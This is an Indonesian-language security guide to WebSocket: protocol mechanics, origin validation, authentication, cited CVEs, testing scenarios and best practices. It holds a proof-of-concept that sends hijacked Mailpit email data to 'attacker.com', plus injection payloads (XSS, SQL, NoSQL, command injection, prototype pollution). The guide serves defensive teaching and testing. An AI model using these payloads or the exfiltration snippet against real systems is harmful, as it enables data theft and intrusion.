# WebSocket dalam Perspektif Cybersecurity

## Daftar Isi

1. [Pengenalan WebSocket](#1-pengenalan-websocket)
2. [Konsep dan Arsitektur WebSocket](#2-konsep-dan-arsitektur-websocket)
    - 2.1 [Arsitektur Dasar](#21-arsitektur-dasar)
    - 2.2 [Model Keamanan Origin](#22-model-keamanan-origin)
3. [Penggunaan WebSocket](#3-penggunaan-websocket)
    - 3.1 [Kasus Penggunaan Utama](#31-kasus-penggunaan-utama)
    - 3.2 [Implementasi di Berbagai Platform](#32-implementasi-di-berbagai-platform)
4. [Cara Kerja WebSocket](#4-cara-kerja-websocket)
    - 4.1 [Fase Handshake (Pembukaan Koneksi)](#41-fase-handshake-pembukaan-koneksi)
    - 4.2 [Fase Transfer Data](#42-fase-transfer-data)
5. [Aspek Keamanan WebSocket](#5-aspek-keamanan-websocket)
    - 5.1 [Enkripsi dengan WSS (WebSocket Secure)](#51-enkripsi-dengan-wss-websocket-secure)
    - 5.2 [Validasi Origin Header](#52-validasi-origin-header)
    - 5.3 [Autentikasi dan Otorisasi](#53-autentikasi-dan-otorisasi)
    - 5.4 [Validasi Input dan Sanitasi Data](#54-validasi-input-dan-sanitasi-data)
    - 5.5 [Rate Limiting dan Kontrol Koneksi](#55-rate-limiting-dan-kontrol-koneksi)
    - 5.6 [Security Headers](#56-security-headers)
6. [Contoh Celah Keamanan pada WebSocket](#6-contoh-celah-keamanan-pada-websocket)
    - 6.1 [Cross-Site WebSocket Hijacking (CSWSH)](#61-cross-site-websocket-hijacking-cswsh)
    - 6.2 [Autentikasi dan Otorisasi yang Lemah](#62-autentikasi-dan-otorisasi-yang-lemah)
    - 6.3 [Broken Function-Level Authorization (BFLA) pada GraphQL WebSocket](#63-broken-function-level-authorization-bfla-pada-graphql-websocket)
    - 6.4 [Serangan Denial of Service (DoS)](#64-serangan-denial-of-service-dos)
    - 6.5 [Serangan Injeksi](#65-serangan-injeksi)
    - 6.6 [WebSocket sebagai Tunnel untuk C2 (Command and Control)](#66-websocket-sebagai-tunnel-untuk-c2-command-and-control)
7. [Skenario Pengujian Keamanan](#7-skenario-pengujian-keamanan)
    - 7.1 [Persiapan dan Tools](#71-persiapan-dan-tools)
    - 7.2 [Skenario Pengujian: Identifikasi Penggunaan WebSocket](#72-skenario-pengujian-identifikasi-penggunaan-websocket)
    - 7.3 [Skenario Pengujian: Validasi Origin (CSWSH)](#73-skenario-pengujian-validasi-origin-cswsh)
    - 7.4 [Skenario Pengujian: Autentikasi dan Otorisasi](#74-skenario-pengujian-autentikasi-dan-otorisasi)
    - 7.5 [Skenario Pengujian: Injeksi dan Validasi Input](#75-skenario-pengujian-injeksi-dan-validasi-input)
    - 7.6 [Skenario Pengujian: Manipulasi Pesan dan Logika Bisnis](#76-skenario-pengujian-manipulasi-pesan-dan-logika-bisnis)
    - 7.7 [Skenario Pengujian: DoS dan Resource Exhaustion](#77-skenario-pengujian-dos-dan-resource-exhaustion)
    - 7.8 [Skenario Pengujian: Keamanan Transport (WSS)](#78-skenario-pengujian-keamanan-transport-wss)
    - 7.9 [Skenario Pengujian: GraphQL over WebSocket](#79-skenario-pengujian-graphql-over-websocket)
    - 7.10 [Metodologi Pengujian Komprehensif](#710-metodologi-pengujian-komprehensif)
8. [Best Practices Keamanan WebSocket](#8-best-practices-keamanan-websocket)

---

## 1. Pengenalan WebSocket

WebSocket adalah protokol komunikasi yang memungkinkan komunikasi dua arah (full-duplex) secara real-time antara klien dan server melalui satu koneksi TCP yang persisten. Berbeda dengan HTTP tradisional yang bersifat request-response dan half-duplex, WebSocket memungkinkan data mengalir secara simultan di kedua arah tanpa overhead berulang untuk membuka dan menutup koneksi.

Protokol ini distandardisasi dalam RFC 6455 dan dirancang untuk mengatasi keterbatasan HTTP dalam skenario komunikasi real-time seperti aplikasi chat, game online, trading saham, dan kolaborasi dokumen. WebSocket menggunakan port yang sama dengan HTTP (80 untuk ws:// dan 443 untuk wss://), sehingga kompatibel dengan infrastruktur web yang ada.

**Perbandingan WebSocket vs HTTP:**

| Aspek | WebSocket | HTTP |
|-------|-----------|------|
| Model Komunikasi | Full-duplex | Half-duplex (request-response) |
| Koneksi | Persisten (long-lived) | Stateless, dibuka-tutup per request |
| Overhead Header | Minimal setelah handshake | Header penuh di setiap request |
| Latensi | Rendah | Lebih tinggi karena polling/overhead |
| Inisiasi Komunikasi | Klien dan server dapat memulai | Hanya klien yang dapat memulai |
| Format Data | Biner dan teks | Umumnya teks |

## 2. Konsep dan Arsitektur WebSocket

### 2.1 Arsitektur Dasar

WebSocket beroperasi pada lapisan aplikasi (Layer 7) model OSI, di atas protokol TCP. Arsitektur WebSocket terdiri dari dua komponen utama:

1. **Klien WebSocket**: Biasanya berjalan di browser web atau aplikasi mobile yang mendukung WebSocket API.
2. **Server WebSocket**: Aplikasi server yang menerima koneksi WebSocket dan menangani pertukaran pesan.

WebSocket menggunakan dua skema URI:
- `ws://` : WebSocket tanpa enkripsi (plaintext), menggunakan port 80
- `wss://` : WebSocket Secure dengan enkripsi TLS/SSL, menggunakan port 443

### 2.2 Model Keamanan Origin

WebSocket mengadopsi model keamanan berbasis origin yang sama dengan browser web. Namun, **penting untuk dicatat bahwa browser tidak memberlakukan Same-Origin Policy (SOP) pada koneksi WebSocket**—keputusan untuk menerima atau menolak koneksi lintas-origin sepenuhnya berada di tangan server.

## 3. Penggunaan WebSocket

### 3.1 Kasus Penggunaan Utama

WebSocket digunakan secara luas dalam berbagai skenario yang membutuhkan komunikasi real-time:

- **Aplikasi Chat dan Pesan Instan**: WhatsApp Web, Slack, Discord
- **Game Online Multiplayer**: Sinkronisasi state game secara real-time
- **Platform Trading Keuangan**: Streaming harga saham dan eksekusi order
- **Kolaborasi Dokumen**: Google Docs, Figma (editing simultan)
- **IoT dan Telemetri**: Streaming data sensor secara kontinu
- **Notifikasi Real-time**: Pemberitahuan push di aplikasi web
- **Streaming Data**: Live score olahraga, update cuaca

### 3.2 Implementasi di Berbagai Platform

WebSocket didukung secara native oleh hampir semua browser modern. Di sisi server, berbagai framework menyediakan implementasi WebSocket seperti Socket.IO, ws (Node.js), WebSocket API di Java, Django Channels (Python), dan Action Cable (Ruby on Rails).

## 4. Cara Kerja WebSocket

Protokol WebSocket terdiri dari dua fase utama: **handshake** dan **transfer data**.

### 4.1 Fase Handshake (Pembukaan Koneksi)

Koneksi WebSocket dimulai dengan HTTP upgrade request. Klien mengirimkan permintaan HTTP khusus yang meminta server untuk "meningkatkan" (upgrade) protokol dari HTTP ke WebSocket.

**Contoh Request Handshake dari Klien:**
```http
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://example.com
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
```

**Penjelasan Header Penting:**
- `Connection: Upgrade` dan `Upgrade: websocket`: Meminta upgrade protokol ke WebSocket
- `Sec-WebSocket-Key`: Nilai base64 acak sepanjang 16 byte yang digunakan untuk membuktikan bahwa server memahami protokol WebSocket
- `Origin`: Menunjukkan asal (origin) dari permintaan—**krusial untuk keamanan**
- `Sec-WebSocket-Version`: Versi protokol WebSocket yang didukung (saat ini 13)

**Contoh Response Handshake dari Server:**
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Server merespons dengan status 101 (Switching Protocols) dan menghitung nilai `Sec-WebSocket-Accept` menggunakan algoritma yang telah ditentukan untuk membuktikan bahwa server benar-benar mendukung protokol WebSocket.

### 4.2 Fase Transfer Data

Setelah handshake berhasil, koneksi TCP yang sama tetap terbuka dan digunakan untuk pertukaran data dalam bentuk **frame**. WebSocket frame memiliki struktur yang efisien dengan overhead minimal (2-14 byte per frame) dibandingkan dengan header HTTP yang bisa mencapai ratusan byte.

**Struktur Dasar WebSocket Frame:**
- FIN bit: Menandakan frame terakhir dalam pesan
- Opcode: Jenis frame (text, binary, ping, pong, close)
- Mask bit: Apakah payload di-mask (wajib untuk frame dari klien ke server)
- Payload length: Panjang data
- Masking key: Kunci 4-byte untuk masking (hanya jika mask bit = 1)
- Payload data: Data aktual yang dikirim

Klien dan server dapat saling mengirim pesan secara asinkron kapan saja hingga salah satu pihak menutup koneksi dengan mengirimkan frame "close".

## 5. Aspek Keamanan WebSocket

WebSocket tidak secara inheren menyediakan mekanisme keamanan—protokol ini hanyalah saluran komunikasi. Keamanan harus diimplementasikan di lapisan aplikasi. Berikut adalah aspek-aspek keamanan kritis yang harus diperhatikan:

### 5.1 Enkripsi dengan WSS (WebSocket Secure)

**Selalu gunakan `wss://` di lingkungan produksi.** WSS mengenkripsi koneksi dengan TLS, mencegah eavesdropping dan serangan man-in-the-middle (MITM). Menggunakan `ws://` (plaintext) memungkinkan penyerang untuk melihat dan memodifikasi data yang ditransmisikan.

Contoh kerentanan nyata: Sebuah gateway WebSocket menggunakan `ws://` plaintext sehingga token `CLAWD_TOKEN` ditransmisikan tanpa perlindungan TLS selama handshake, memungkinkan pencurian kredensial.

### 5.2 Validasi Origin Header

Validasi Origin header adalah pertahanan utama melawan **Cross-Site WebSocket Hijacking (CSWSH)** . Server **harus** memverifikasi bahwa nilai Origin header dalam handshake sesuai dengan domain yang diizinkan.

**Implementasi yang Benar (Node.js dengan ws):**
```javascript
const WebSocket = require('ws');
const wss = new WebSocket.Server({
  port: 8080,
  verifyClient: (info) => {
    const allowedOrigins = ['https://example.com', 'https://app.example.com'];
    const origin = info.origin;
    return allowedOrigins.includes(origin);
  }
});
```

**Implementasi yang Salah (Rentan CSWSH):**
```javascript
const upgrader = websocket.Upgrader{
  CheckOrigin: func(r *http.Request) bool { 
    return true  // Menerima SEMUA origin — SANGAT BERBAHAYA!
  }
}
```

### 5.3 Autentikasi dan Otorisasi

WebSocket tidak memiliki mekanisme autentikasi bawaan. Autentikasi harus diimplementasikan oleh aplikasi dengan salah satu cara berikut:

1. **Autentikasi saat Handshake**: Mengirim token (JWT atau session ID) melalui cookie atau header Authorization pada HTTP upgrade request, lalu memvalidasinya sebelum menerima koneksi.
2. **Autentikasi Pasca-Handshake**: Menerima koneksi tetapi meminta autentikasi melalui pesan WebSocket pertama sebelum mengizinkan akses ke fungsionalitas.

**Praktik Terbaik:**
- Validasi token di sisi server sebelum menerima koneksi
- Token harus memiliki masa berlaku pendek (short-lived)
- Periksa otorisasi untuk **setiap pesan atau aksi**, bukan hanya saat handshake
- Terapkan mekanisme refresh token untuk koneksi yang berumur panjang

### 5.4 Validasi Input dan Sanitasi Data

Semua data yang diterima melalui WebSocket harus diperlakukan sebagai **untrusted input**. Server harus melakukan validasi dan sanitasi yang ketat.

- Validasi struktur payload (misalnya menggunakan JSON Schema)
- Sanitasi input untuk mencegah XSS dan injeksi
- Hindari `eval()` atau eksekusi kode dinamis pada data dari WebSocket
- Batasi ukuran pesan untuk mencegah serangan DoS berbasis memori

### 5.5 Rate Limiting dan Kontrol Koneksi

WebSocket yang persisten rentan terhadap penyalahgunaan sumber daya:

- **Rate Limiting per Koneksi**: Batasi jumlah pesan per detik dari satu koneksi
- **Message Size Limits**: Tetapkan batas ukuran maksimum per pesan
- **Connection Timeouts**: Putuskan koneksi yang idle terlalu lama
- **Global Connection Limits**: Batasi jumlah total koneksi bersamaan per IP/user
- **Heartbeat/Ping-Pong**: Gunakan mekanisme ping-pong untuk mendeteksi koneksi mati

### 5.6 Security Headers

Meskipun WebSocket tidak menggunakan HTTP setelah handshake, security headers yang tepat pada respons handshake tetap penting:

- `Content-Security-Policy`: Batasi sumber daya yang dapat dimuat
- `Strict-Transport-Security`: Paksa penggunaan HTTPS/WSS
- `X-Content-Type-Options`: Cegah MIME sniffing

## 6. Contoh Celah Keamanan pada WebSocket

### 6.1 Cross-Site WebSocket Hijacking (CSWSH)

**Deskripsi**: CSWSH terjadi ketika server WebSocket tidak memvalidasi Origin header, memungkinkan situs web berbahaya untuk membuat koneksi WebSocket ke server target menggunakan kredensial korban (cookie yang dikirim otomatis oleh browser).

**Dampak**: Penyerang dapat membaca dan mengirim pesan atas nama korban, mencuri data sensitif, atau melakukan aksi tidak sah.

**Contoh Kasus Nyata - Mailpit (CVE-2026-22689)** :

Mailpit adalah tool pengembangan lokal untuk menangkap email. Kerentanannya terletak pada fungsi `CheckOrigin` yang dikonfigurasi untuk selalu mengembalikan `true`, menerima koneksi dari origin manapun.

**Skenario Eksploitasi:**
1. Developer menjalankan Mailpit di `localhost:8025`
2. Developer mengunjungi situs berbahaya (atau situs yang terkompromi)
3. JavaScript di situs berbahaya membuat koneksi WebSocket ke `ws://localhost:8025/api/events`
4. Browser mengizinkan koneksi karena server tidak memvalidasi Origin
5. Penyerang menerima semua data email secara real-time, termasuk subjek, pengirim, penerima, dan isi email

**Contoh Kode Eksploitasi (PoC):**
```javascript
const ws = new WebSocket('ws://localhost:8025/api/events');
ws.onmessage = (event) => {
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: event.data
  });
};
```

**Kasus Nyata Lainnya - Nanobot (CVE-2026-35589)** :

Bridge WhatsApp Nanobot rentan terhadap CSWSH karena server tidak memvalidasi Origin header. Setiap situs web yang dikunjungi pengguna dapat terhubung ke `ws://127.0.0.1:3001/` dan mendapatkan akses penuh ke API bridge, memungkinkan penyerang membajak sesi WhatsApp, membaca pesan, mencuri QR code autentikasi, dan mengirim pesan atas nama korban.

### 6.2 Autentikasi dan Otorisasi yang Lemah

**Deskripsi**: Banyak implementasi WebSocket gagal menerapkan autentikasi yang konsisten atau melakukan otorisasi hanya pada saat handshake, mengabaikan validasi untuk pesan-pesan berikutnya.

**Contoh Kasus Nyata - Hoverfly (CVE-2025-54376)** :

Hoverfly adalah tool simulasi API. Endpoint WebSocket admin `/api/v2/ws/logs` tidak dilindungi oleh middleware autentikasi yang sama dengan REST admin API. Akibatnya, meskipun flag `--auth` diaktifkan, endpoint WebSocket tetap dapat diakses tanpa autentikasi.

**Dampak**: Penyerang dapat menerima log aplikasi lengkap, termasuk body request/response yang diproksi, token autentikasi, dan path file—informasi yang sangat sensitif.

### 6.3 Broken Function-Level Authorization (BFLA) pada GraphQL WebSocket

**Deskripsi**: Aplikasi yang menggunakan GraphQL subscriptions melalui WebSocket sering kali gagal menerapkan otorisasi yang tepat pada level fungsi.

**Contoh Kasus Nyata** :

Ostorlab AI Pentest Engine menemukan kerentanan BFLA kritis pada endpoint GraphQL WebSocket yang memungkinkan pengguna yang tidak terautentikasi untuk:
1. Melakukan koneksi WebSocket tanpa kredensial apapun
2. Melakukan GraphQL introspection untuk memetakan schema
3. Mengeksekusi subscription `translateContent` dan menerima data sensitif secara real-time

**Pelajaran**: Otorisasi harus diperiksa pada **setiap tahap**: saat koneksi, saat subscription initiation, dan saat filtering data per event.

### 6.4 Serangan Denial of Service (DoS)

WebSocket rentan terhadap berbagai serangan DoS:

- **Connection Flooding**: Membuka ribuan koneksi WebSocket untuk menghabiskan resource server
- **Message Flooding**: Mengirim pesan dalam jumlah besar melalui satu koneksi
- **Large Payload Attacks**: Mengirim payload berukuran sangat besar yang menyebabkan memory exhaustion
- **Slowloris-style Attacks**: Mengirim frame secara sangat lambat untuk menjaga koneksi tetap terbuka

### 6.5 Serangan Injeksi

Karena data WebSocket sering diproses oleh aplikasi, berbagai serangan injeksi dapat terjadi:

- **SQL/NoSQL Injection**: Jika data WebSocket digunakan dalam query database tanpa sanitasi
- **XSS (Cross-Site Scripting)**: Jika data dari WebSocket ditampilkan di UI tanpa encoding yang tepat
- **Command Injection**: Jika data WebSocket digunakan dalam perintah sistem
- **Deserialization Attacks**: Jika payload JSON atau format lainnya di-deserialize secara tidak aman

### 6.6 WebSocket sebagai Tunnel untuk C2 (Command and Control)

WebSocket juga dapat digunakan oleh penyerang sebagai mekanisme komunikasi untuk malware.

**Contoh: RoadK1ll Implant**

RoadK1ll adalah implant berbasis Node.js yang membuat koneksi WebSocket keluar (outbound) ke infrastruktur yang dikontrol penyerang dan menggunakannya sebagai tunnel untuk meneruskan traffic TCP. Ini memungkinkan penyerang untuk melakukan pivoting di dalam jaringan korban tanpa perlu koneksi masuk (inbound) yang sering diblokir oleh firewall.

## 7. Skenario Pengujian Keamanan

Pengujian keamanan WebSocket memerlukan pendekatan yang berbeda dari pengujian HTTP tradisional karena sifat koneksi yang persisten dan stateful.

### 7.1 Persiapan dan Tools

**Tools yang Diperlukan:**
- **Burp Suite**: WebSocket history, Repeater untuk manipulasi pesan, dan Intruder untuk fuzzing
- **OWASP ZAP**: WebSocket tab untuk monitoring dan manipulasi
- **Browser Developer Tools**: Network tab untuk inspeksi frame WebSocket
- **wscat**: CLI WebSocket client untuk pengujian manual
- **Custom Scripts**: JavaScript/Python untuk automasi pengujian

### 7.2 Skenario Pengujian: Identifikasi Penggunaan WebSocket

**Langkah-langkah:**
1. Inspeksi source code aplikasi untuk URI `ws://` atau `wss://`
2. Gunakan Chrome DevTools → Network tab → filter "WS"
3. Gunakan Burp Suite → Proxy → WebSockets history
4. Identifikasi endpoint WebSocket dan pola komunikasi

### 7.3 Skenario Pengujian: Validasi Origin (CSWSH)

**Langkah-langkah:**
1. Catat WebSocket handshake request, perhatikan nilai Origin header
2. Buat halaman HTML di origin berbeda yang mencoba koneksi ke endpoint yang sama
3. Jika koneksi berhasil dan server merespons dengan 101 Switching Protocols, server **tidak** memvalidasi Origin → rentan CSWSH
4. Verifikasi apakah cookie sesi dikirim otomatis (browser mengirim cookie untuk koneksi WebSocket)

**Contoh Script Pengujian CSWSH:**
```javascript
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  console.log('CSWSH: Connection accepted - VULNERABLE');
  ws.send(JSON.stringify({action: 'getSensitiveData'}));
};
ws.onmessage = (e) => {
  console.log('Data received:', e.data);
  // Kirim ke server penyerang
};
```

### 7.4 Skenario Pengujian: Autentikasi dan Otorisasi

**Pengujian Bypass Autentikasi:**
1. Coba koneksi WebSocket tanpa cookie/token autentikasi
2. Coba dengan token yang sudah kadaluarsa
3. Coba dengan token yang dimodifikasi (tampering)
4. Setelah koneksi terjalin, coba akses resource yang seharusnya memerlukan autentikasi

**Pengujian Eskalasi Privilege:**
1. Autentikasi sebagai user biasa
2. Manipulasi parameter dalam pesan WebSocket untuk mengakses data user lain
3. Uji apakah ID resource dapat diubah untuk mengakses data yang tidak diotorisasi

### 7.5 Skenario Pengujian: Injeksi dan Validasi Input

**Menggunakan Burp Suite Repeater:**
1. Buka Burp Suite → Proxy → WebSockets history
2. Pilih pesan WebSocket, klik kanan → "Send to Repeater"
3. Modifikasi payload pesan dengan payload injeksi
4. Kirim pesan yang dimodifikasi dan amati respons

**Payload Pengujian yang Direkomendasikan:**
```javascript
// XSS Payload
{"message": "<img src=x onerror=alert(1)>"}

// SQL Injection
{"userId": "1' OR '1'='1"}

// NoSQL Injection
{"$where": "function(){return true;}"}

// Command Injection
{"file": "test; ls -la"}

// JSON Deserialization
{"__proto__": {"isAdmin": true}}

// Large Payload (DoS)
{"data": "A".repeat(1000000)}
```

### 7.6 Skenario Pengujian: Manipulasi Pesan dan Logika Bisnis

**Pengujian Race Condition:**
1. Kirim beberapa pesan secara simultan dengan cepat
2. Amati apakah state aplikasi menjadi tidak konsisten
3. Uji operasi yang sensitif terhadap urutan (misalnya transfer dana, pengurangan stok)

**Pengujian Replay Attack:**
1. Tangkap pesan WebSocket yang valid
2. Kirim ulang (replay) pesan tersebut setelah beberapa waktu
3. Amati apakah server memproses ulang tanpa validasi sequence/timestamp

**Pengujian Parameter Tampering:**
1. Identifikasi parameter dalam pesan WebSocket (misalnya `userId`, `roomId`, `amount`)
2. Ubah nilai parameter tersebut
3. Verifikasi apakah server memvalidasi otorisasi untuk nilai yang diubah

### 7.7 Skenario Pengujian: DoS dan Resource Exhaustion

**Pengujian Connection Flood:**
- Buka banyak koneksi WebSocket secara simultan (gunakan script)
- Pantau respons server dan resource usage
- Catat pada jumlah koneksi berapa server mulai menolak koneksi baru

**Pengujian Message Flood:**
- Kirim pesan dengan frekuensi tinggi melalui satu koneksi
- Amati apakah rate limiting diterapkan

**Pengujian Large Payload:**
- Kirim payload dengan ukuran yang meningkat secara bertahap
- Tentukan batas ukuran pesan yang diterima server

### 7.8 Skenario Pengujian: Keamanan Transport (WSS)

**Langkah-langkah:**
1. Verifikasi bahwa endpoint produksi menggunakan `wss://` (bukan `ws://`)
2. Periksa konfigurasi TLS (sertifikat valid, cipher suite kuat, TLS 1.2+)
3. Uji apakah koneksi `ws://` masih diterima (seharusnya ditolak atau di-redirect ke `wss://`)

### 7.9 Skenario Pengujian: GraphQL over WebSocket

**Khusus untuk endpoint GraphQL WebSocket:**
1. Uji apakah koneksi dapat dibuat tanpa autentikasi (`connection_init` tanpa token)
2. Uji apakah introspection query dapat dijalankan tanpa autentikasi
3. Uji subscription operations tanpa token yang valid
4. Uji apakah satu koneksi dapat mengakses subscription milik user lain

### 7.10 Metodologi Pengujian Komprehensif

OWASP Web Security Testing Guide merekomendasikan pendekatan sistematis:

1. **Identifikasi**: Temukan semua endpoint WebSocket dalam aplikasi
2. **Pemetaan**: Dokumentasikan skema pesan, parameter, dan alur komunikasi
3. **Pengujian Autentikasi/Otorisasi**: Uji kontrol akses di setiap tahap
4. **Pengujian Validasi Input**: Uji injeksi dan manipulasi parameter
5. **Pengujian Logika Bisnis**: Uji abuse case spesifik domain
6. **Pengujian Infrastruktur**: Uji konfigurasi proxy, load balancer, dan message broker
7. **Pelaporan**: Dokumentasikan temuan dengan PoC yang jelas

## 8. Best Practices Keamanan WebSocket

| Kategori | Praktik Terbaik |
|----------|-----------------|
| **Transport** | Selalu gunakan `wss://` (WebSocket over TLS) di produksi |
| **Origin** | Validasi Origin header secara ketat (whitelist, bukan blacklist) |
| **Autentikasi** | Autentikasi saat handshake; validasi token di setiap pesan kritis |
| **Otorisasi** | Terapkan otorisasi per pesan/aksi, bukan hanya saat koneksi |
| **Validasi Input** | Sanitasi semua input; gunakan schema validation |
| **Rate Limiting** | Batasi koneksi per IP, pesan per koneksi, dan ukuran pesan |
| **Monitoring** | Log aktivitas mencurigakan; pantau pola koneksi abnormal |
| **Heartbeat** | Implementasikan ping/pong untuk deteksi koneksi mati |
| **Timeout** | Batasi durasi koneksi idle maksimum |
| **Headers** | Terapkan security headers pada respons handshake |
